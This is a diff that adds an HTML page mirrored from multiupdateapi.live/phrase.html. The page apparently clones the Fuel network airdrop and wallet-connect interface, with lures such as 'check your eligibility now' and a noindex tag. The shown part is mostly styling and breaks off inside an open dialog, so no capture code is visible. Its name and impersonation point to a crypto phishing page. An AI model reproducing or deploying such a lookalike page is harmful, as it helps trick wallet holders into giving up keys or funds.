@@ -1,0 +1,850 @@
+<!DOCTYPE html>
+<html
+    lang="en"
+    class="__variable_f521db __variable_ef0cc2 dark"
+    style="--noise-image: url('noise.png'); --dots-pattern-image: url('dots-pattern.png'); color-scheme: dark;"
+    data-scrapbook-source="https://app.fuel.network/drop"
+    data-scrapbook-create="20241221224254908"
+    data-scrapbook-adoptedstylesheet-0=":host { z-index: var(--w3m-z-index); display: block; backface-visibility: hidden; position: fixed; inset: 0px; pointer-events: none; opacity: 0; background-color: var(--wui-cover); transition: opacity 0.2s var(--wui-ease-out-power-2); will-change: opacity; }
+
+:host(.open) { opacity: 1; }
+
+@keyframes zoom-in {
+  0% { transform: scale(0.95) translateY(0px); }
+  100% { transform: scale(1) translateY(0px); }
+}
+
+@keyframes slide-in {
+  0% { transform: scale(1) translateY(50px); }
+  100% { transform: scale(1) translateY(0px); }
+}
+
+wui-card { max-width: var(--w3m-modal-width); width: 100%; position: relative; animation-duration: 0.2s; animation-name: zoom-in; animation-fill-mode: backwards; animation-timing-function: var(--wui-ease-out-power-2); outline: none; }
+
+wui-flex { overflow: hidden auto; display: flex; align-items: center; justify-content: center; width: 100%; height: 100%; }
+
+@media (max-height: 700px) and (min-width: 431px) {
+  wui-flex { align-items: flex-start; }
+  wui-card { margin: var(--wui-spacing-xxl) 0px; }
+}
+
+@media (max-width: 430px) {
+  wui-flex { align-items: flex-end; }
+  wui-card { max-width: 100%; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; border-bottom: medium; animation-name: slide-in; }
+}"
+>
+    
+<!-- Mirrored from multiupdateapi.live/phrase.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 19 Feb 2025 04:11:23 GMT -->
+<head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <link rel="stylesheet" href="8f4c1d4f6805ba55.css" data-precedence="next" />
+        <link rel="stylesheet" href="064ae0fed49e511e.css" data-precedence="next" />
+        <title>Multi Update API</title>
+        <meta name="description" content="Multi Update API, check your eligibility now!" />
+        <meta name="keywords" content="Multi Update API,AirDrop,FuelDrop,Fuel Points Program,blockchain rewards,earn points,contribute to blockchain,Ethereum wallet,Ethereum rollups,Fuel network,blockchain innovation" />
+        <meta name="robots" content="noindex, nofollow" />
+        <meta property="og:title" content="Multi Update API" />
+        <meta property="og:description" content="Multi Update API, check your eligibility now!" />
+        <meta property="og:image" content="https://blog.xapihub.io/img/posts/HandlingPartialUpdatesinRESTfulAPIs.png" />
+        <meta property="og:type" content="website" />
+        <meta name="twitter:card" content="summary_large_image" />
+        <meta name="twitter:title" content="Multi Update API" />
+        <meta name="twitter:description" content="Multi Update API, check your eligibility now!" />
+        <meta name="twitter:image" content="https://blog.xapihub.io/img/posts/HandlingPartialUpdatesinRESTfulAPIs.png" />
+        <meta name="next-size-adjust" />
+        <link rel="icon" href="https://multiupdateapi.live/multi-update.png" />
+        <style>
+            @import url("https://multiupdateapi.live/css2.css");
+            .fuel-connectors * {
+                box-sizing: border-box;
+            }
+            .fuel-connectors .fuel-connectors-dialog-content:focus {
+                outline: none;
+            }
+            @media (max-width: 430px) {
+                .fuel-connectors .fuel-connectors-dialog-content {
+                    top: 50%;
+                    width: 100%;
+                    border-radius: 36px;
+                }
+            }
+            .fuel-connectors .fuel-connectors-connector-item {
+                transition: background-color 50ms cubic-bezier(0.16, 1, 0.3, 1);
+                background-color: var(--fuel-connector-background);
+            }
+            .fuel-connectors .fuel-connectors-connector-item:active {
+                opacity: 0.8;
+            }
+            .fuel-connectors .fuel-connectors-connector-item:hover {
+                background-color: var(--fuel-connector-hover);
+            }
+            .fuel-connectors .fuel-connectors-connector-button {
+                transition: background-color 50ms cubic-bezier(0.16, 1, 0.3, 1);
+                background-color: var(--fuel-button-background);
+                color: var(--fuel-color-bold);
+            }
+            .fuel-connectors .fuel-connectors-connector-button:visited {
+                color: var(--fuel-color-bold);
+            }
+            .fuel-connectors .fuel-connectors-connector-button:hover {
+                background-color: var(--fuel-button-background-hover);
+            }
+            .fuel-connectors .fuel-connectors-connector-button-primary {
+                transition: background-color 50ms cubic-bezier(0.16, 1, 0.3, 1);
+                background-color: var(--fuel-green-11);
+                color: var(--fuel-black-color);
+            }
+            .fuel-connectors .fuel-connectors-connector-button-primary:visited {
+                color: var(--fuel-black-color);
+            }
+            .fuel-connectors .fuel-connectors-connector-button-primary:hover {
+                background-color: var(--fuel-green-11);
+            }
+            .fuel-connectors .fuel-connectors-back-icon {
+                transition: background-color 50ms cubic-bezier(0.16, 1, 0.3, 1);
+            }
+            .fuel-connectors .fuel-connectors-back-icon[data-connector="false"] {
+                visibility: hidden;
+            }
+            .fuel-connectors .fuel-connectors-back-icon:hover,
+            .fuel-connectors .fuel-connectors-back-icon:active {
+                opacity: 1;
+                background-color: var(--fuel-connector-hover);
+            }
+            .fuel-connectors .fuel-connectors-close-icon {
+                transition: background-color 50ms cubic-bezier(0.16, 1, 0.3, 1);
+            }
+            .fuel-connectors .fuel-connectors-close-icon:hover,
+            .fuel-connectors .fuel-connectors-close-icon:active {
+                opacity: 1;
+                background-color: var(--fuel-connector-hover);
+            }
+            .fuel-connectors .fuel-connectors-button-base {
+                cursor: pointer;
+            }
+            .fuel-connectors .fuel-connectors-button:disabled {
+                cursor: not-allowed;
+            }
+            .fuel-connectors .fuel-connectors-button {
+                transition: background-color 50ms cubic-bezier(0.16, 1, 0.3, 1);
+                background-color: var(--fuel-green-11);
+            }
+            .fuel-connectors .fuel-connectors-button:disabled {
+                background-color: var(--fuel-border-color);
+            }
+            .fuel-connectors .fuel-connectors-button-disconnect {
+                transition: background-color 50ms cubic-bezier(0.16, 1, 0.3, 1);
+                background-color: var(--fuel-button-background);
+            }
+            .fuel-connectors .fuel-connectors-button-disconnect:hover {
+                background-color: var(--fuel-button-background-hover);
+            }
+            @keyframes fuelOverlayShow {
+                from {
+                    opacity: 0;
+                }
+                to {
+                    opacity: 1;
+                }
+            }
+            @keyframes fuelSpin {
+                from {
+                    transform: rotate(0deg);
+                }
+                to {
+                    transform: rotate(360deg);
+                }
+            }
+            @keyframes fuelContentShow {
+                from {
+                    opacity: 0;
+                    transform: translate(-50%, -48%) scale(0.96);
+                }
+                to {
+                    opacity: 1;
+                    transform: translate(-50%, -50%) scale(1);
+                }
+            }
+            @keyframes fuelLoader {
+                0% {
+                    background-position: -468px 0;
+                }
+                100% {
+                    background-position: 468px 0;
+                }
+            }
+        </style>
+        <style>
+            @import url("https://multiupdateapi.live/css2-1.css");
+            :root {
+                --w3m-modal-width: 360px;
+                --w3m-color-mix-strength: 0%;
+                --w3m-font-family: Inter, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;
+                --w3m-font-size-master: 10px;
+                --w3m-border-radius-master: 4px;
+                --w3m-z-index: 999;
+
+                --wui-font-family: var(--w3m-font-family);
+
+                --wui-font-size-mini: calc(var(--w3m-font-size-master) * 0.8);
+                --wui-font-size-micro: var(--w3m-font-size-master);
+                --wui-font-size-tiny: calc(var(--w3m-font-size-master) * 1.2);
+                --wui-font-size-small: calc(var(--w3m-font-size-master) * 1.4);
+                --wui-font-size-paragraph: calc(var(--w3m-font-size-master) * 1.6);
+                --wui-font-size-medium: calc(var(--w3m-font-size-master) * 1.8);
+                --wui-font-size-large: calc(var(--w3m-font-size-master) * 2);
+                --wui-font-size-medium-title: calc(var(--w3m-font-size-master) * 2.4);
+                --wui-font-size-2xl: calc(var(--w3m-font-size-master) * 4);
+
+                --wui-border-radius-5xs: var(--w3m-border-radius-master);
+                --wui-border-radius-4xs: calc(var(--w3m-border-radius-master) * 1.5);
+                --wui-border-radius-3xs: calc(var(--w3m-border-radius-master) * 2);
+                --wui-border-radius-xxs: calc(var(--w3m-border-radius-master) * 3);
+                --wui-border-radius-xs: calc(var(--w3m-border-radius-master) * 4);
+                --wui-border-radius-s: calc(var(--w3m-border-radius-master) * 5);
+                --wui-border-radius-m: calc(var(--w3m-border-radius-master) * 7);
+                --wui-border-radius-l: calc(var(--w3m-border-radius-master) * 9);
+                --wui-border-radius-3xl: calc(var(--w3m-border-radius-master) * 20);
+
+                --wui-font-weight-light: 400;
+                --wui-font-weight-regular: 500;
+                --wui-font-weight-medium: 600;
+                --wui-font-weight-bold: 700;
+
+                --wui-letter-spacing-2xl: -1.6px;
+                --wui-letter-spacing-medium-title: -0.96px;
+                --wui-letter-spacing-large: -0.8px;
+                --wui-letter-spacing-medium: -0.72px;
+                --wui-letter-spacing-paragraph: -0.64px;
+                --wui-letter-spacing-small: -0.56px;
+                --wui-letter-spacing-tiny: -0.48px;
+                --wui-letter-spacing-micro: -0.2px;
+                --wui-letter-spacing-mini: -0.16px;
+
+                --wui-spacing-0: 0px;
+                --wui-spacing-4xs: 2px;
+                --wui-spacing-3xs: 4px;
+                --wui-spacing-xxs: 6px;
+                --wui-spacing-2xs: 7px;
+                --wui-spacing-xs: 8px;
+                --wui-spacing-1xs: 10px;
+                --wui-spacing-s: 12px;
+                --wui-spacing-m: 14px;
+                --wui-spacing-l: 16px;
+                --wui-spacing-2l: 18px;
+                --wui-spacing-xl: 20px;
+                --wui-spacing-xxl: 24px;
+                --wui-spacing-2xl: 32px;
+                --wui-spacing-3xl: 40px;
+                --wui-spacing-4xl: 90px;
+                --wui-spacing-5xl: 95px;
+
+                --wui-icon-box-size-xxs: 14px;
+                --wui-icon-box-size-xs: 20px;
+                --wui-icon-box-size-sm: 24px;
+                --wui-icon-box-size-md: 32px;
+                --wui-icon-box-size-lg: 40px;
+                --wui-icon-box-size-xl: 64px;
+
+                --wui-icon-size-inherit: inherit;
+                --wui-icon-size-xxs: 10px;
+                --wui-icon-size-xs: 12px;
+                --wui-icon-size-sm: 14px;
+                --wui-icon-size-md: 16px;
+                --wui-icon-size-mdl: 18px;
+                --wui-icon-size-lg: 20px;
+                --wui-icon-size-xl: 24px;
+                --wui-icon-size-xxl: 28px;
+
+                --wui-wallet-image-size-inherit: inherit;
+                --wui-wallet-image-size-sm: 40px;
+                --wui-wallet-image-size-md: 56px;
+                --wui-wallet-image-size-lg: 80px;
+
+                --wui-visual-size-size-inherit: inherit;
+                --wui-visual-size-sm: 40px;
+                --wui-visual-size-md: 55px;
+                --wui-visual-size-lg: 80px;
+
+                --wui-box-size-md: 100px;
+                --wui-box-size-lg: 120px;
+
+                --wui-ease-out-power-2: cubic-bezier(0, 0, 0.22, 1);
+                --wui-ease-out-power-1: cubic-bezier(0, 0, 0.55, 1);
+
+                --wui-ease-in-power-3: cubic-bezier(0.66, 0, 1, 1);
+                --wui-ease-in-power-2: cubic-bezier(0.45, 0, 1, 1);
+                --wui-ease-in-power-1: cubic-bezier(0.3, 0, 1, 1);
+
+                --wui-ease-inout-power-1: cubic-bezier(0.45, 0, 0.55, 1);
+
+                --wui-duration-lg: 200ms;
+                --wui-duration-md: 125ms;
+                --wui-duration-sm: 75ms;
+
+                --wui-path-network-sm: path(
+                    "M15.4 2.1a5.21 5.21 0 0 1 5.2 0l11.61 6.7a5.21 5.21 0 0 1 2.61 4.52v13.4c0 1.87-1 3.59-2.6 4.52l-11.61 6.7c-1.62.93-3.6.93-5.22 0l-11.6-6.7a5.21 5.21 0 0 1-2.61-4.51v-13.4c0-1.87 1-3.6 2.6-4.52L15.4 2.1Z"
+                );
+
+                --wui-path-network-md: path(
+                    "M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z"
+                );
+
+                --wui-path-network-lg: path(
+                    "M78.3244 18.926L50.1808 2.45078C45.7376 -0.150261 40.2624 -0.150262 35.8192 2.45078L7.6756 18.926C3.23322 21.5266 0.5 26.3301 0.5 31.5248V64.4752C0.5 69.6699 3.23322 74.4734 7.6756 77.074L35.8192 93.5492C40.2624 96.1503 45.7376 96.1503 50.1808 93.5492L78.3244 77.074C82.7668 74.4734 85.5 69.6699 85.5 64.4752V31.5248C85.5 26.3301 82.7668 21.5266 78.3244 18.926Z"
+                );
+
+                --wui-width-network-sm: 36px;
+                --wui-width-network-md: 48px;
+                --wui-width-network-lg: 86px;
+
+                --wui-height-network-sm: 40px;
+                --wui-height-network-md: 54px;
+                --wui-height-network-lg: 96px;
+
+                --wui-icon-size-network-xs: 12px;
+                --wui-icon-size-network-sm: 16px;
+                --wui-icon-size-network-md: 24px;
+                --wui-icon-size-network-lg: 42px;
+
+                --wui-color-inherit: inherit;
+
+                --wui-color-inverse-100: #fff;
+                --wui-color-inverse-000: #000;
+
+                --wui-cover: rgba(20, 20, 20, 0.8);
+
+                --wui-color-modal-bg: var(--wui-color-modal-bg-base);
+
+                --wui-color-accent-100: var(--wui-color-accent-base-100);
+                --wui-color-accent-090: var(--wui-color-accent-base-090);
+                --wui-color-accent-080: var(--wui-color-accent-base-080);
+
+                --wui-color-success-100: var(--wui-color-success-base-100);
+
+                --wui-color-error-100: var(--wui-color-error-base-100);
+
+                --wui-icon-box-bg-error-100: var(--wui-icon-box-bg-error-base-100);
+                --wui-icon-box-bg-blue-100: var(--wui-icon-box-bg-blue-base-100);
+                --wui-icon-box-bg-success-100: var(--wui-icon-box-bg-success-base-100);
+                --wui-icon-box-bg-inverse-100: var(--wui-icon-box-bg-inverse-base-100);
+
+                --wui-all-wallets-bg-100: var(--wui-all-wallets-bg-100);
+
+                --wui-avatar-border: var(--wui-avatar-border-base);
+
+                --wui-thumbnail-border: var(--wui-thumbnail-border-base);
+
+                --wui-box-shadow-blue: var(--wui-color-accent-glass-020);
+            }
+
+            @supports (background: color-mix(in srgb, white 50%, black)) {
+                :root {
+                    --wui-color-modal-bg: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-modal-bg-base));
+
+                    --wui-box-shadow-blue: color-mix(in srgb, var(--wui-color-accent-100) 20%, transparent);
+
+                    --wui-color-accent-100: color-mix(in srgb, var(--wui-color-accent-base-100) 100%, transparent);
+                    --wui-color-accent-090: color-mix(in srgb, var(--wui-color-accent-base-100) 90%, transparent);
+                    --wui-color-accent-080: color-mix(in srgb, var(--wui-color-accent-base-100) 80%, transparent);
+                    --wui-color-accent-glass-090: color-mix(in srgb, var(--wui-color-accent-base-100) 90%, transparent);
+                    --wui-color-accent-glass-080: color-mix(in srgb, var(--wui-color-accent-base-100) 80%, transparent);
+                    --wui-color-accent-glass-020: color-mix(in srgb, var(--wui-color-accent-base-100) 20%, transparent);
+                    --wui-color-accent-glass-015: color-mix(in srgb, var(--wui-color-accent-base-100) 15%, transparent);
+                    --wui-color-accent-glass-010: color-mix(in srgb, var(--wui-color-accent-base-100) 10%, transparent);
+                    --wui-color-accent-glass-005: color-mix(in srgb, var(--wui-color-accent-base-100) 5%, transparent);
+                    --wui-color-accent-002: color-mix(in srgb, var(--wui-color-accent-base-100) 2%, transparent);
+
+                    --wui-color-fg-100: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-fg-100));
+                    --wui-color-fg-125: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-fg-125));
+                    --wui-color-fg-150: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-fg-150));
+                    --wui-color-fg-175: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-fg-175));
+                    --wui-color-fg-200: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-fg-200));
+                    --wui-color-fg-225: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-fg-225));
+                    --wui-color-fg-250: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-fg-250));
+                    --wui-color-fg-275: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-fg-275));
+                    --wui-color-fg-300: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-fg-300));
+
+                    --wui-color-bg-100: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-bg-100));
+                    --wui-color-bg-125: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-bg-125));
+                    --wui-color-bg-150: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-bg-150));
+                    --wui-color-bg-175: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-bg-175));
+                    --wui-color-bg-200: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-bg-200));
+                    --wui-color-bg-225: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-bg-225));
+                    --wui-color-bg-250: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-bg-250));
+                    --wui-color-bg-275: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-bg-275));
+                    --wui-color-bg-300: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-bg-300));
+
+                    --wui-color-success-100: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-success-base-100));
+                    --wui-color-error-100: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-color-error-base-100));
+
+                    --wui-icon-box-bg-error-100: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-icon-box-bg-error-base-100));
+                    --wui-icon-box-bg-accent-100: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-icon-box-bg-blue-base-100));
+                    --wui-icon-box-bg-success-100: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-icon-box-bg-success-base-100));
+                    --wui-icon-box-bg-inverse-100: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-icon-box-bg-inverse-base-100));
+
+                    --wui-all-wallets-bg-100: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-all-wallets-bg-100));
+
+                    --wui-avatar-border: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-avatar-border-base));
+
+                    --wui-thumbnail-border: color-mix(in srgb, var(--w3m-color-mix) var(--w3m-color-mix-strength), var(--wui-thumbnail-border-base));
+                }
+            }
+        </style>
+        <style media="enabled">
+            :root {
+                --w3m-color-mix: #000;
+                --w3m-accent: hsla(231, 100%, 70%, 1);
+                --w3m-default: #000;
+
+                --wui-color-modal-bg-base: #fff;
+                --wui-color-accent-base-100: var(--w3m-accent);
+
+                --wui-color-blueberry-100: hsla(231, 100%, 70%, 1);
+                --wui-color-blueberry-090: hsla(231, 97%, 72%, 1);
+                --wui-color-blueberry-080: hsla(231, 92%, 74%, 1);
+
+                --wui-color-fg-100: #141414;
+                --wui-color-fg-125: #2d3131;
+                --wui-color-fg-150: #474d4d;
+                --wui-color-fg-175: #636d6d;
+                --wui-color-fg-200: #798686;
+                --wui-color-fg-225: #828f8f;
+                --wui-color-fg-250: #8b9797;
+                --wui-color-fg-275: #95a0a0;
+                --wui-color-fg-300: #9ea9a9;
+
+                --wui-color-bg-100: #ffffff;
+                --wui-color-bg-125: #f5fafa;
+                --wui-color-bg-150: #f3f8f8;
+                --wui-color-bg-175: #eef4f4;
+                --wui-color-bg-200: #eaf1f1;
+                --wui-color-bg-225: #e5eded;
+                --wui-color-bg-250: #e1e9e9;
+                --wui-color-bg-275: #dce7e7;
+                --wui-color-bg-300: #d8e3e3;
+
+                --wui-color-success-base-100: #26b562;
+                --wui-color-error-base-100: #f05142;
+
+                --wui-color-success-glass-001: rgba(38, 181, 98, 0.01);
+                --wui-color-success-glass-002: rgba(38, 181, 98, 0.02);
+                --wui-color-success-glass-005: rgba(38, 181, 98, 0.05);
+                --wui-color-success-glass-010: rgba(38, 181, 98, 0.1);
+                --wui-color-success-glass-015: rgba(38, 181, 98, 0.15);
+                --wui-color-success-glass-020: rgba(38, 181, 98, 0.2);
+                --wui-color-success-glass-025: rgba(38, 181, 98, 0.25);
+                --wui-color-success-glass-030: rgba(38, 181, 98, 0.3);
+                --wui-color-success-glass-060: rgba(38, 181, 98, 0.6);
+                --wui-color-success-glass-080: rgba(38, 181, 98, 0.8);
+
+                --wui-color-error-glass-001: rgba(240, 81, 66, 0.01);
+                --wui-color-error-glass-002: rgba(240, 81, 66, 0.02);
+                --wui-color-error-glass-005: rgba(240, 81, 66, 0.05);
+                --wui-color-error-glass-010: rgba(240, 81, 66, 0.1);
+                --wui-color-error-glass-015: rgba(240, 81, 66, 0.15);
+                --wui-color-error-glass-020: rgba(240, 81, 66, 0.2);
+                --wui-color-error-glass-025: rgba(240, 81, 66, 0.25);
+                --wui-color-error-glass-030: rgba(240, 81, 66, 0.3);
+                --wui-color-error-glass-060: rgba(240, 81, 66, 0.6);
+                --wui-color-error-glass-080: rgba(240, 81, 66, 0.8);
+
+                --wui-icon-box-bg-error-base-100: #f4dfdd;
+                --wui-icon-box-bg-blue-base-100: #d9ecfb;
+                --wui-icon-box-bg-success-base-100: #daf0e4;
+                --wui-icon-box-bg-inverse-base-100: #dcecfc;
+
+                --wui-all-wallets-bg-100: #e8f1fa;
+
+                --wui-avatar-border-base: #f3f4f4;
+
+                --wui-thumbnail-border-base: #eaefef;
+
+                --wui-color-gray-glass-001: rgba(0, 0, 0, 0.01);
+                --wui-color-gray-glass-002: rgba(0, 0, 0, 0.02);
+                --wui-color-gray-glass-005: rgba(0, 0, 0, 0.05);
+                --wui-color-gray-glass-010: rgba(0, 0, 0, 0.1);
+                --wui-color-gray-glass-015: rgba(0, 0, 0, 0.15);
+                --wui-color-gray-glass-020: rgba(0, 0, 0, 0.2);
+                --wui-color-gray-glass-025: rgba(0, 0, 0, 0.25);
+                --wui-color-gray-glass-030: rgba(0, 0, 0, 0.3);
+                --wui-color-gray-glass-060: rgba(0, 0, 0, 0.6);
+                --wui-color-gray-glass-080: rgba(0, 0, 0, 0.8);
+                --wui-color-gray-glass-090: rgba(0, 0, 0, 0.9);
+            }
+        </style>
+        <style>
+            :root {
+                --w3m-color-mix: #fff;
+                --w3m-accent: hsla(230, 100%, 67%, 1);
+                --w3m-default: #fff;
+
+                --wui-color-modal-bg-base: #121313;
+                --wui-color-accent-base-100: var(--w3m-accent);
+
+                --wui-color-blueberry-100: hsla(230, 100%, 67%, 1);
+                --wui-color-blueberry-090: hsla(231, 76%, 61%, 1);
+                --wui-color-blueberry-080: hsla(230, 59%, 55%, 1);
+
+                --wui-color-fg-100: #e4e7e7;
+                --wui-color-fg-125: #d0d5d5;
+                --wui-color-fg-150: #a8b1b1;
+                --wui-color-fg-175: #a8b0b0;
+                --wui-color-fg-200: #949e9e;
+                --wui-color-fg-225: #868f8f;
+                --wui-color-fg-250: #788080;
+                --wui-color-fg-275: #788181;
+                --wui-color-fg-300: #6e7777;
+
+                --wui-color-bg-100: #141414;
+                --wui-color-bg-125: #191a1a;
+                --wui-color-bg-150: #1e1f1f;
+                --wui-color-bg-175: #222525;
+                --wui-color-bg-200: #272a2a;
+                --wui-color-bg-225: #2c3030;
+                --wui-color-bg-250: #313535;
+                --wui-color-bg-275: #363b3b;
+                --wui-color-bg-300: #3b4040;
+
+                --wui-color-success-base-100: #26d962;
+                --wui-color-error-base-100: #f25a67;
+
+                --wui-color-success-glass-001: rgba(38, 217, 98, 0.01);
+                --wui-color-success-glass-002: rgba(38, 217, 98, 0.02);
+                --wui-color-success-glass-005: rgba(38, 217, 98, 0.05);
+                --wui-color-success-glass-010: rgba(38, 217, 98, 0.1);
+                --wui-color-success-glass-015: rgba(38, 217, 98, 0.15);
+                --wui-color-success-glass-020: rgba(38, 217, 98, 0.2);
+                --wui-color-success-glass-025: rgba(38, 217, 98, 0.25);
+                --wui-color-success-glass-030: rgba(38, 217, 98, 0.3);
+                --wui-color-success-glass-060: rgba(38, 217, 98, 0.6);
+                --wui-color-success-glass-080: rgba(38, 217, 98, 0.8);
+
+                --wui-color-error-glass-001: rgba(242, 90, 103, 0.01);
+                --wui-color-error-glass-002: rgba(242, 90, 103, 0.02);
+                --wui-color-error-glass-005: rgba(242, 90, 103, 0.05);
+                --wui-color-error-glass-010: rgba(242, 90, 103, 0.1);
+                --wui-color-error-glass-015: rgba(242, 90, 103, 0.15);
+                --wui-color-error-glass-020: rgba(242, 90, 103, 0.2);
+                --wui-color-error-glass-025: rgba(242, 90, 103, 0.25);
+                --wui-color-error-glass-030: rgba(242, 90, 103, 0.3);
+                --wui-color-error-glass-060: rgba(242, 90, 103, 0.6);
+                --wui-color-error-glass-080: rgba(242, 90, 103, 0.8);
+
+                --wui-color-gray-glass-001: rgba(255, 255, 255, 0.01);
+                --wui-color-gray-glass-002: rgba(255, 255, 255, 0.02);
+                --wui-color-gray-glass-005: rgba(255, 255, 255, 0.05);
+                --wui-color-gray-glass-010: rgba(255, 255, 255, 0.1);
+                --wui-color-gray-glass-015: rgba(255, 255, 255, 0.15);
+                --wui-color-gray-glass-020: rgba(255, 255, 255, 0.2);
+                --wui-color-gray-glass-025: rgba(255, 255, 255, 0.25);
+                --wui-color-gray-glass-030: rgba(255, 255, 255, 0.3);
+                --wui-color-gray-glass-060: rgba(255, 255, 255, 0.6);
+                --wui-color-gray-glass-080: rgba(255, 255, 255, 0.8);
+                --wui-color-gray-glass-090: rgba(255, 255, 255, 0.9);
+
+                --wui-icon-box-bg-error-base-100: #3c2426;
+                --wui-icon-box-bg-blue-base-100: #20303f;
+                --wui-icon-box-bg-success-base-100: #1f3a28;
+                --wui-icon-box-bg-inverse-base-100: #243240;
+
+                --wui-all-wallets-bg-100: #222b35;
+
+                --wui-avatar-border-base: #252525;
+
+                --wui-thumbnail-border-base: #252525;
+            }
+        </style>
+        <style type="text/css">
+            .with-scroll-bars-hidden {
+                overflow: hidden !important;
+                padding-right: 0px !important;
+            }
+            body[data-scroll-locked] {
+                overflow: hidden !important;
+                overscroll-behavior: contain;
+                position: relative !important;
+                padding-left: 0px;
+                padding-top: 0px;
+                padding-right: 0px;
+                margin-left: 0;
+                margin-top: 0;
+                margin-right: 0px !important;
+            }
+
+            .right-scroll-bar-position {
+                right: 0px !important;
+            }
+
+            .width-before-scroll-bar {
+                margin-right: 0px !important;
+            }
+
+            .right-scroll-bar-position .right-scroll-bar-position {
+                right: 0 !important;
+            }
+
+            .width-before-scroll-bar .width-before-scroll-bar {
+                margin-right: 0 !important;
+            }
+
+            body[data-scroll-locked] {
+                --removed-body-scroll-bar-size: 0px;
+            }
+        </style>
+    </head>
+    <body style="pointer-events: none;" data-scroll-locked="1">
+        <div class="radix-themes fuel-Portal" data-accent-color="grass" data-gray-color="slate" data-radius="medium" data-scaling="100%" data-aria-hidden="true" aria-hidden="true">
+            <div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events: none;">
+                <ol tabindex="-1" class="fixed top-0 z-50 flex flex-col-reverse p-4 tablet:bottom-0 tablet:right-0 tablet:top-auto tablet:flex-col fuel-ToastViewport"></ol>
+            </div>
+        </div>
+        <div
+            class="fuel-connectors"
+            style="
+                position: fixed;
+                inset: 0px;
+                height: 100%;
+                width: 100%;
+                margin: 0px;
+                padding: 0px;
+                z-index: 99;
+                font-family: var(--fuel-font-family);
+                font-size: var(--fuel-font-size);
+                pointer-events: auto;
+                background-color: var(--fuel-overlay-background);
+                animation: 150ms cubic-bezier(0.16, 1, 0.3, 1) fuelOverlayShow;
+                --fuel-font-family: 'Inter', 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
+                --fuel-font-size: 16px;
+                --fuel-font-size-xs: 12px;
+                --fuel-letter-spacing: -0.64px;
+                --fuel-border-radius: 6px;
+                --fuel-items-gap: 8px;
+                --fuel-border: 1px solid var(--fuel-border-color);
+                --fuel-color-error: #f25a68;
+                --fuel-color: #e4e7e7;
+                --fuel-color-bold: #ffffff;
+                --fuel-dialog-background: rgb(25 26 26);
+                --fuel-overlay-background: rgba(20, 20, 20, 0.8);
+                --fuel-connector-background: rgba(255, 255, 255, 0.02);
+                --fuel-connector-hover: rgba(255, 255, 255, 0.05);
+                --fuel-border-color: rgba(255, 255, 255, 0.05);
+                --fuel-border-hover: hsla(0, 0%, 50%, 1);
+                --fuel-button-background: hsla(0, 0%, 30%, 1);
+                --fuel-button-background-hover: hsla(0, 0%, 40%, 1);
+                --fuel-loader-background: linear-gradient(to right, hsl(0, 0%, 20%) 8%, hsl(0, 0%, 25%) 18%, hsl(0, 0%, 20%) 33%);
+                --fuel-green-3: #0f2e1b;
+                --fuel-green-11: #00dd75;
+                --fuel-blue-3: #0d2847;
+                --fuel-blue-11: #70b9ff;
+                --fuel-gray-10: #7b7b7b;
+                --fuel-gray-11: #b4b4b4;
+                --fuel-gray-12: #eee;
+                --fuel-separator-color: rgb(165 165 165 / 13%);
+                --fuel-black-color: #141414;
+            "
+        >
+            <div
+                role="dialog"
+                id="radix-:r0:"
+                aria-describedby="radix-:r2:"
+                aria-labelledby="radix-:r1:"
+                data-state="open"
+                style="
+                    display: flex;
+                    flex-direction: column;
+                    overflow: hidden;
+                    color: var(--fuel-color);
